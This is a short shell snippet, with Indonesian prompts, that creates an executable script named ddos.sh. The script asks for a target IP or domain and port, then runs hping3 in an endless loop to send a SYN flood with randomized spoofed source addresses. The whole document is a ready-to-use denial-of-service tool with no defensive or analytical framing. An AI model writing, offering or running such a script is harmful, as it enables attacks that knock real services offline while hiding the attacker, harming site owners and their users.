cat > ddos.sh << EOF
#!/bin/bash
read -p "Target (IP/Domain): " target
read -p "Port (default 80): " port
port=\${port:-80}
read -p "Paket per detik: " pkt
echo "Menyerang \$target di port \$port..."
while true; do
   hping3 -S --flood -V -p \$port \$target --rand-source
done
EOF
chmod +x ddos.sh
